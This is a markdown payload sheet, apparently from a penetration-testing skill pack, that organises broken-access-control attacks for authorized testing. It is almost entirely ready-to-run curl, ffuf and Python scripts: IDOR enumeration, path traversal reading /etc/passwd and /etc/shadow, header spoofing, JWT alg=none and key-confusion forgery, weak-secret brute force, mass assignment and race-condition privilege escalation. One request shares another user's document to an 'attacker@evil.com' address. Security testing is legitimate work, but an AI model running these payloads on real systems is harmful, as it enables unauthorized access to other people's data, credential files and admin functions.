# web-access-control — payloads (verbatim from kali-claw)

# Broken Access Control Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for access control testing by attack type.
> Purpose: Quickly find request construction patterns for IDOR, privilege escalation, path traversal, forced browsing, and other attacks.
> All payloads are for authorized security testing only.

---

## Index

1. [IDOR (Insecure Direct Object Reference)](#1-idor-insecure-direct-object-reference)
2. [Privilege Escalation](#2-privilege-escalation)
3. [Path Traversal](#3-path-traversal)
4. [Forced Browsing](#4-forced-browsing)
5. [Parameter Tampering](#5-parameter-tampering)
6. [HTTP Method Tampering](#6-http-method-tampering)
7. [Header Spoofing Bypass](#7-header-spoofing-bypass)

---

## 1. IDOR (Insecure Direct Object Reference)

### Integer ID Replacement

```bash
# Access User_B's resource using User_A's credentials
curl -s -H "Cookie: session=USER_A_TOKEN" \
     http://target/api/v1/users/123/profile
curl -s -H "Cookie: session=USER_A_TOKEN" \
     http://target/api/v1/users/456/profile
# Both return 200 -> IDOR confirmed
```

### ffuf Batch IDOR

```bash
# Integer ID range
ffuf -u "http://target/api/v1/users/FUZZ/profile" \
     -w <(seq 1 1000) \
     -H "Cookie: session=USER_A_TOKEN" \
     -fc 403,404 -mc 200

# POST request IDOR
ffuf -u "http://target/api/v1/orders" \
     -X POST -H "Content-Type: application/json" \
     -H "Cookie: session=USER_A_TOKEN" \
     -d '{"user_id": FUZZ, "action": "view"}' \
     -w <(seq 1 500) -fc 403,404
```

### UUID-Based IDOR

```bash
# Collect UUIDs from API responses
curl -s -H "Cookie: session=TOKEN" \
     http://target/api/v1/users/me/posts | jq '.[].author_id'

# Batch test
for uuid in $(cat collected_uuids.txt); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
          -H "Cookie: session=OTHER_TOKEN" \
          "http://target/api/v1/documents/$uuid")
    [ "$code" = "200" ] && echo "[+] IDOR: $uuid"
done
```

### Multi-Level IDOR

```bash
# Organization -> Project -> Document three-level
curl -s -H "Cookie: session=TOKEN" \
     http://target/api/v1/orgs/1/projects/5/docs/42
# Replace IDs layer by layer, testing authorization checks at each level
```

---

## 2. Privilege Escalation

### Vertical Privilege Escalation -- Admin Endpoint Discovery

```bash
ADMIN_ENDPOINTS=("/admin" "/administrator" "/manage" "/console" "/dashboard"
  "/admin/users" "/admin/settings" "/admin/config" "/admin/logs"
  "/api/v1/admin/users" "/api/internal/debug")

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -H "Cookie: session=$USER_TOKEN" \
             "http://target$endpoint")
    if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ] && [ "$STATUS" != "404" ]; then
        echo "[+] $endpoint -> $STATUS (possible privilege escalation)"
    fi
done
```

### Role Parameter Tampering

```bash
# Inject role via JSON body
curl -s -H "Cookie: session=$USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","user_id":123}' \
     "http://target/api/v1/users/update"

# Cookie/JWT claims tampering
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin
```

---

## 3. Path Traversal

### Basic Path Traversal

```bash
curl "http://target/file?name=../../../etc/passwd"
curl "http://target/file?name=../../etc/shadow"
curl "http://target/file?name=../../../proc/self/environ"
```

### URL Encoding Bypass

```bash
# Single encoding
curl "http://target/file?name=..%2f..%2f..%2fetc/passwd"

# Double encoding
curl "http://target/file?name=..%252f..%252f..%252fetc/passwd"
curl --path-as-is "http://target/..%252f..%252f..%252fetc/passwd"
```

### Unicode/Special Encoding Bypass

```bash
curl "http://target/file?name=..%c0%ae%c0%ae%c0%afetc/passwd"
curl "http://target/file?name=..\\..\\..\\windows\\win.ini"
curl "http://target/file?name=....//....//....//etc/passwd"
```

### ffuf Batch Path Traversal

```bash
ffuf -u "http://target/file?name=FUZZ" \
     -w path_traversal_payloads.txt \
     -fc 403,404 -mc 200 -fs 0
```

---

## 4. Forced Browsing

### Sensitive Directory Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://target/FUZZ -mc 200,401,403

# Backup/sensitive files
for file in backup.sql users.csv .env .git/HEAD config.yml dump.sql; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://target/$file")
    [ "$code" = "200" ] && echo "[+] Found: /$file"
done
```

### API Version Discovery

```bash
for ver in v1 v2 v3 api rest internal admin staging beta; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
           -H "Cookie: session=$USER_TOKEN" \
           "http://target/$ver/admin/users")
    [ "$code" != "404" ] && echo "[+] /$ver/admin/users -> $code"
done
```

---

## 5. Parameter Tampering

### Case Obfuscation

```bash
curl "http://target/Admin/Dashboard"
curl "http://target/ADMIN/DELETE_USER"
curl "http://target/aDmIn/dElEtE"
```

### URL Encoding and Path Parameter Obfuscation

```bash
curl "http://target/%61dmin/%64elete"         # /admin/delete
curl "http://target/admin;/dashboard"
curl "http://target/admin/./dashboard"
curl --path-as-is "http://target/admin%00/dashboard"
curl "http://target/admin%0a/dashboard"
curl "http://target/admin%23/dashboard"
```

### JSON Parameter Injection

```bash
# Add extra parameters
curl -s -X PATCH http://target/api/v1/users/123 \
     -H "Cookie: session=$TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","role":"admin","is_admin":true}'
```

---

## 6. HTTP Method Tampering

```bash
TARGET_URL="http://target/admin/delete_user?id=1"
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -X "$method" -H "Cookie: session=$USER_TOKEN" \
             "$TARGET_URL")
    echo "[$method] -> $STATUS"
done
# Common bypass: GET is blocked but PUT/DELETE are not
```

---

## 7. Header Spoofing Bypass

### X-Original-URL Bypass

```bash
# Some frameworks (e.g. Spring) support this header to override routing
curl -H "X-Original-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"

curl -H "X-Rewrite-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"
```

### IP Spoofing to Bypass Internal Access Controls

```bash
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/admin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: localhost" \
     "http://target/admin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Originating-IP: 127.0.0.1" \
     -H "X-Client-IP: 127.0.0.1" \
     "http://target/admin/debug"
```

---

## 8. JWT Token Manipulation

### None Algorithm Attack
```bash
# Decode JWT header, change alg to "none"
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
# Combine with payload (no signature)
# header.payload.
```

### Role Claim Tampering
```bash
# Decode payload
echo "$JWT_PAYLOAD" | base64 -d
# Change "role":"user" to "role":"admin"
# Re-encode and sign (if key is known/weak)
```

### Key Confusion (RS256 → HS256)
```python
import jwt
import requests

# Get public key
pub_key = requests.get("http://target/.well-known/jwks.json").json()

# Sign with public key using HS256
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    pub_key,
    algorithm="HS256"
)
```

## 9. Multi-Step Privilege Escalation

### Horizontal to Vertical
```bash
# Step 1: Access another user's profile (horizontal)
curl -H "Authorization: Bearer $TOKEN" "http://target/api/users/2/profile"

# Step 2: Find admin user ID from user listing
curl -H "Authorization: Bearer $TOKEN" "http://target/api/users?role=admin"

# Step 3: Access admin profile (vertical)
curl -H "Authorization: Bearer $TOKEN" "http://target/api/users/1/profile"

# Step 4: Modify admin settings
curl -X PUT -H "Authorization: Bearer $TOKEN" \
     -d '{"role":"admin"}' "http://target/api/users/$(whoami)/role"
```

### Race Condition Privilege Escalation
```python
import threading
import requests

def change_role():
    requests.put(
        "http://target/api/profile",
        json={"role": "admin"},
        headers={"Authorization": f"Bearer {token}"}
    )

# Send multiple concurrent requests
threads = [threading.Thread(target=change_role) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

## 10. API Endpoint Discovery

### Forced Browsing Wordlist
```bash
# Common admin endpoints
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 50

# API versioning bypass
curl http://target/api/v1/admin/users    # 403
curl http://target/api/v2/admin/users    # might be 200
curl http://target/api/internal/users    # undocumented

# GraphQL introspection
curl -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

### Swagger/OpenAPI Exposure
```bash
# Common documentation endpoints
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /docs; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://target$path")
  echo "$path: $status"
done
```

---

## 11. IDOR Exploitation (Advanced)

### Sequential ID Enumeration with Response Diffing

```bash
# Enumerate sequential IDs and compare response sizes to detect data leakage
BASE_URL="http://target/api/v1/invoices"
AUTH="Cookie: session=$USER_TOKEN"

for id in $(seq 1 500); do
  RESP=$(curl -s -w "\n%{http_code}|%{size_download}" \
    -H "$AUTH" "${BASE_URL}/${id}")
  CODE=$(echo "$RESP" | tail -1 | cut -d'|' -f1)
  SIZE=$(echo "$RESP" | tail -1 | cut -d'|' -f2)
  [ "$CODE" = "200" ] && [ "$SIZE" -gt 50 ] && \
    echo "[+] ID=$id CODE=$CODE SIZE=$SIZE bytes"
done | tee /tmp/idor-enum-results.txt
```

### UUID Prediction via Timestamp Analysis

```python
import uuid
import requests
from datetime import datetime, timedelta

def predict_uuids_v1(known_uuid, target_url, token):
    """Predict UUID v1 values based on timestamp and node components"""
    # UUID v1 contains timestamp and MAC address
    parsed = uuid.UUID(known_uuid)
    timestamp = parsed.time  # 100-nanosecond intervals since 1582-10-15
    node = parsed.node
    clock_seq = parsed.clock_seq

    # Generate UUIDs for nearby timestamps (within 1 hour)
    predicted = []
    for offset in range(-3600, 3600):
        # Each second = 10,000,000 100-ns intervals
        new_time = timestamp + (offset * 10_000_000)
        try:
            candidate = uuid.UUID(fields=(
                new_time & 0xFFFFFFFF,
                (new_time >> 32) & 0xFFFF,
                ((new_time >> 48) & 0x0FFF) | 0x1000,
                clock_seq >> 8,
                clock_seq & 0xFF,
                node
            ))
            predicted.append(str(candidate))
        except ValueError:
            continue

    # Test predicted UUIDs
    hits = []
    for candidate_uuid in predicted[:100]:
        resp = requests.get(
            f"{target_url}/{candidate_uuid}",
            headers={"Authorization": f"Bearer {token}"}
        )
        if resp.status_code == 200:
            hits.append({"uuid": candidate_uuid, "data": resp.json()})

    return hits
```

### Parameter Tampering with Nested Objects

```bash
# Test IDOR via nested JSON parameters
curl -s -X POST "http://target/api/v1/documents/share" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"document_id": "OTHER_USER_DOC_ID", "share_with": "attacker@evil.com"}'

# Array-based IDOR — access multiple resources in one request
curl -s -X POST "http://target/api/v1/bulk/download" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids": [1, 2, 3, 100, 200, 500, 1000]}'

# GraphQL IDOR via node ID manipulation
curl -s -X POST "http://target/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ node(id: \"VXNlcjoxMDA=\") { ... on User { email, role, ssn } } }"}'

# Base64 decode: "User:100" -> try "User:1" (admin)
echo -n "User:1" | base64  # VXNlcjox
curl -s -X POST "http://target/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ node(id: \"VXNlcjox\") { ... on User { email, role } } }"}'
```

### IDOR via File Reference Manipulation

```bash
# Manipulate file download references
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/v1/files/download?ref=user_123_report.pdf"
# Change to another user's file
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/v1/files/download?ref=user_456_report.pdf"

# S3 pre-signed URL parameter tampering
# Original: /api/files?key=uploads/user123/private.pdf
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/files?key=uploads/user456/private.pdf"

# Hash-based reference brute force
for i in $(seq 1 100); do
  HASH=$(echo -n "document_${i}" | md5sum | cut -d' ' -f1)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "http://target/api/v1/docs/${HASH}")
  [ "$CODE" = "200" ] && echo "[+] Found: document_${i} -> ${HASH}"
done
```

### IDOR in WebSocket Messages

```python
import asyncio
import websockets
import json

async def test_websocket_idor(ws_url, token, target_ids):
    """Test IDOR vulnerabilities in WebSocket-based APIs"""
    async with websockets.connect(
        ws_url,
        extra_headers={"Authorization": f"Bearer {token}"}
    ) as ws:
        for target_id in target_ids:
            # Subscribe to another user's channel
            await ws.send(json.dumps({
                "action": "subscribe",
                "channel": f"user_{target_id}_notifications"
            }))
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(response)
            if data.get("status") != "forbidden":
                print(f"[+] IDOR: Subscribed to user {target_id} channel")
                print(f"    Data: {json.dumps(data)[:200]}")

            # Request another user's data via WebSocket
            await ws.send(json.dumps({
                "action": "get_profile",
                "user_id": target_id
            }))
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(response)
            if "email" in str(data) or "phone" in str(data):
                print(f"[+] IDOR: Got PII for user {target_id}")

asyncio.run(test_websocket_idor("wss://target/ws", TOKEN, range(1, 50)))
```

---

## 12. Role-Based Access Bypass

### Privilege Escalation via Mass Assignment

```bash
# Register new user with injected admin role
curl -s -X POST "http://target/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","email":"a@b.com","role":"admin","is_staff":true,"is_superuser":true}'

# Update profile with hidden admin fields
curl -s -X PUT "http://target/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Normal User","role_id":1,"permissions":["admin:*"],"group":"administrators"}'

# Test various privilege field names
for field in role is_admin admin privilege level group_id permission_level access_level user_type account_type; do
  echo "[*] Testing field: $field"
  curl -s -X PATCH "http://target/api/v1/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"$field\": \"admin\"}" | jq '.role // .is_admin // .privilege // empty'
done
```

### Admin Panel Access via Direct URL

```bash
# Comprehensive admin panel discovery
ADMIN_PATHS=(
  "/admin" "/admin/" "/administrator" "/manage" "/management"
  "/console" "/portal" "/cp" "/controlpanel" "/backend"
  "/admin/dashboard" "/admin/users" "/admin/settings"
  "/api/admin" "/api/v1/admin" "/api/internal"
  "/_admin" "/~admin" "/admin.php" "/wp-admin"
  "/admin/login" "/admin/index" "/panel"
  "/system" "/sys" "/internal" "/staff"
)

echo "[*] Testing $(echo ${#ADMIN_PATHS[@]}) admin paths with regular user token"
for path in "${ADMIN_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" \
    "http://target${path}")
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "301" ] || [ "$STATUS" = "302" ]; then
    echo "[+] ACCESSIBLE: ${path} -> ${STATUS}"
  fi
done
```

### Function-Level Authorization Bypass

```bash
# Test admin-only API functions with regular user credentials
ADMIN_FUNCTIONS=(
  "POST /api/v1/users/create"
  "DELETE /api/v1/users/123"
  "PUT /api/v1/settings/global"
  "POST /api/v1/roles/assign"
  "GET /api/v1/audit/logs"
  "POST /api/v1/backup/create"
  "DELETE /api/v1/cache/flush"
  "PUT /api/v1/config/update"
  "POST /api/v1/users/bulk-delete"
  "GET /api/v1/reports/financial"
)

for func in "${ADMIN_FUNCTIONS[@]}"; do
  METHOD=$(echo "$func" | cut -d' ' -f1)
  ENDPOINT=$(echo "$func" | cut -d' ' -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$METHOD" \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
    -H "Content-Type: application/json" \
    "http://target${ENDPOINT}")
  if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ]; then
    echo "[+] BYPASS: $METHOD $ENDPOINT -> $STATUS"
  fi
done
```

### JWT Role Escalation Techniques

```python
import jwt
import base64
import json
import requests

def escalate_jwt_role(token, target_url):
    """Attempt multiple JWT manipulation techniques for role escalation"""
    results = []

    # Decode without verification
    parts = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

    # Technique 1: alg=none
    header_none = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    payload["role"] = "admin"
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b"=").decode()
    none_token = f"{header_none}.{payload_b64}."

    resp = requests.get(target_url, headers={"Authorization": f"Bearer {none_token}"})
    results.append({"technique": "alg_none", "status": resp.status_code})

    # Technique 2: Weak secret brute force
    common_secrets = ["secret", "password", "123456", "key", "jwt_secret", "changeme"]
    for secret in common_secrets:
        try:
            forged = jwt.encode(payload, secret, algorithm="HS256")
            resp = requests.get(target_url, headers={"Authorization": f"Bearer {forged}"})
            if resp.status_code == 200:
                results.append({"technique": f"weak_secret:{secret}", "status": 200})
                break
        except Exception:
            continue

    return results
```

### Permission Boundary Testing

```bash
# Test cross-role actions (user A performing user B's role-specific actions)
# Scenario: Regular user trying manager-only operations

# Approve leave request (manager only)
curl -s -X POST "http://target/api/v1/leave/approve" \
  -H "Authorization: Bearer $REGULAR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"request_id": 42, "approved": true}'

# Access salary information (HR only)
curl -s "http://target/api/v1/employees/salary?department=engineering" \
  -H "Authorization: Bearer $REGULAR_TOKEN"

# Modify another team's project (cross-team boundary)
curl -s -X PUT "http://target/api/v1/projects/other-team-project/settings" \
  -H "Authorization: Bearer $REGULAR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"visibility": "public", "allow_external": true}'
```

---

## 13. Multi-Tenancy Attacks

### Tenant Isolation Bypass

```bash
# Manipulate tenant identifier in headers
curl -s "http://target/api/v1/users" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -H "X-Tenant-ID: tenant-b-id"

# Tenant ID in subdomain vs header mismatch

<!-- truncated for token budget; see external/kali-claw for the rest -->

